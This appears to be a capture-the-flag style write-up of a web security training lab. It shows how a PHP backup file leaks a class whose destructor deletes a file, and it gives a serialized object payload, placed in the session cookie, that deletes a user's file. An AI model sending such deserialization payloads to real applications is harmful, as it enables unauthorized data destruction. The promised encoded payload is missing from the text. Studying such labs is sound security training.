When you start the lab, notice that the "/libs/CustomTemplate.php" file is mentioned
in the HTML source code:
    <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
If you try to access the page
    https://<YOUR-LAB-ID>.web-security-academy.net/libs/CustomTemplate.php
You will be greeted by a blank page. But if you check the hint:
    "You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file."
Hence you access:
    https://<YOUR-LAB-ID>.web-security-academy.net/libs/CustomTemplate.php~ (see how the tilde is appended)
You will get in output the PHP code "CustomTemplate.php" available in this folder

After careful reading, we notice the following things

The class is the file is called "CustomTemplate" and it has two attributes:
    private $template_file_path;
    private $lock_file_path;

We find this interesting function
function __destruct() {
    // Carlos thought this would be a good idea
    if (file_exists($this->lock_file_path)) {
        unlink($this->lock_file_path);
    }
}

So if we can really pass any object in the session and it will be serialized, we can make up a CustomTemplate object
and bind the "/home/carlos/morale.txt" file to the lock_file_path variable, and it will be actually deleted.

So we build the following serialized object:
    O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

Which Base64 + URL Encoded becomes

We replace the session cookie, refresh the page and the lab is indeed solved!
